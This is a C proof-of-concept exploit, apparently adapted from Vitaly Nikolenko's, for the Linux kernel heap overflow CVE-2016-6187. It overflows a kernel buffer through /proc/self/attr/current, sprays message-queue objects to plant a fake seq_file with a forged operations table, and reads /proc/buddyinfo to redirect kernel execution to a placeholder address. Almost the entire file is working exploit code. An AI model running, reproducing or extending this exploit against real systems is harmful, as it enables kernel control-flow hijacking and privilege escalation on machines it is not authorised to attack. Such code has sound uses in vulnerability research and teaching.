/**
 * poc for CVE-2016-6187, originally written by Vitaly Nikolenko
 * modified by kylebot
 *
 * modified by kylebot
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "libexp.h"

#define CRASH_IP 0xffffffffdeadbeef

struct seq_file {
	char hole1[0x40];
	char mutex[0x20];
	void* op;
	char hole2[0x18];
};

struct seq_operations {
	void* start;
	void* stop;
	void* next;
	int* show;
};

char payload[0x80];
struct seq_operations fake_op;
struct seq_file *fake_seq_file;
struct seq_operations fake_op;
int fd;

void setup_context()
{
	fd = open("/proc/self/attr/current", O_RDWR);
	if (fd == -1)
		error_out("trigger fd");
}

void setup_payload()
{
	memset(payload, 'A', sizeof(payload));
	fake_seq_file = (struct seq_file *)(payload - 0x28);
	fake_seq_file->op = (void *)&fake_op;
	memset(fake_seq_file->mutex, 0, 0x20);
	fake_op.start = (void *)CRASH_IP;
}

int main(int argc, char **argv)
{
	char buf[0x80];
	sleep(1);

	//set_cpu(0);

	setup_context();
	setup_payload();

	// fill the buffer so the vulnerability can be triggered
	memset(buf, 'A', sizeof(buf));

	// maximize time slice
	ts_fence();

	// defragmentation
	//defragment(0x80, 100);

	// trigger vulnerability
	write(fd, buf, 0x80);

	// fill a hole
	defragment(0x80, 1);

	// open proc file to allocate seq_file
	int seq_fd = open("/proc/buddyinfo", O_RDONLY);
	if (unlikely(seq_fd == -1))
		error_out("seq_fd");

	//nonsense();

	// overwrite seq_file
	struct msg_spray_t *spray = msg_spray(payload, 0x40, 1);

	// trigger crash
	read(seq_fd, buf, 4);

	// clean up
	msg_spray_clean(spray);
	return 0;
}
